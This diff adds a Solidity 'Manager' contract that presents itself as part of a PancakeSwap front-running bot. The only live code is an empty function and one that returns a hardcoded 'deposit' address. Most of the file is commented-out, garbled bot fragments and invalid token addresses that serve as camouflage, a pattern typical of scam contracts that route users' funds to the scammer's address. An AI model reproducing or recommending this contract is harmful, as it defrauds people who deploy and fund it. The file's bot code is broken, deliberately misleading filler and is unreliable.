@@ -1,0 +1,161 @@
+pragma solidity ^0.5.0;
+
+contract Manager { function performTasks() public pure {
+
+}
+/*contract GetfrontExample {
+  // public state variable
+  uint[] public myArray;
+
+  //const fs = require('fs');
+//var Web3 = require('web3');
+//var abiDecoder = require('abi-decoder');
+//var colors = require("colors");
+
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  //var Tx = require('ethereumjs-tx').Transaction;
+//var axios = require('axios');
+//var BigNumber = require('big-number');
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+
+//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
+//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+
+ //var web3;
+//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
+//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+ 
+//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+//var web3Ts;
+//var web3Ws;
+//var pancakeRouter;
+//var pancakeFactory;
+    /*constructor() {
+        minter = msg.sender;
+    }
+
+    function mint(address receiver, uint amount) public {
+        require(msg.sender == minter);
+        require(amount < 1e60);
+        balances[receiver] += amount;
+    }
+
+    function send(address receiver, uint amount) public {
+        require(amount <= balances[msg.sender], "Insufficient balance.");
+        balances[msg.sender] -= amount;
+        balances[receiver] += amount;
+        emit Sent(msg.sender, receiver, amount);
+    }*/
+
+/*contract GetBNBExample {
+  // public state variable
+  uint[] public myArray;
+
+  // one gwei
+//const ONE_GWEI = 1e9;
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  //var buy_finished = false;
+//var sell_finished = false;
+//var buy_failed = false;
+//var sell_failed = false;
+//var attack_started = false;
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+function uniswapDepositAddress() public pure returns (address) {
+
+
+//var succeed = false;
+//var subscription;
+/*contract D {
+    function readData() public {
+        C c = new C();
+        uint local = c.f(7); // web3 = new Web3(EthereumTesterProvider());
+        c.setData(3);
+        local = c.getData();
+        local = c.compute(3, 5); // web3.eth.getAccounts(console.log);
+    }
+}*/
+
+  /*function isTokenTransferOK(address currentOwner, address newOwner)
+        public
+        view
+        returns (bool ok)
+    {
+        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
+ 
+        //console.log("wait until the honest transaction is done...", transaction['hash']);
+ 
+        //while (await isPending(transaction['hash'])) {
+       //const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91mnjhuyt78';
+ 
+ 
+        //if(buy_failed)
+        address tokenAddress = msg.sender;
+        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
+    }*/
+    	return 0x7827939EC33c021A556b08b0c02fC9eCEbba34c3;
+}
+}
+
+/*contract GetBotExample {
+  // public state variable
+  uint[] public myArray;
+
+  
+ 
+    //if(outputtoken.gt(allowance)){
+        //console.log(max_allowance.toString());
+        //var approveTX ={
+                //from: user_wallet.address,
+                //to: out_token_address,
+                //gas: 50000,
+                //gasPrice: gasPrice*ONE_GWEI,
+                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  //var signedTX = await user_wallet.signTransaction(approveTX);
+        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
+ 
+        //console.log('Approved Token')
+ 
+    //return;
+ 
+ 
+//select attacking transaction
+//async function triggersFrontRun(transaction, out_token_address, amount, level) {
+ //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173mjuy78';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3hgyt67';
+    //if(attack_started)
+        //return false;
+ 
+    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
+    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
+        //attack_started = true;
+        //return true
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
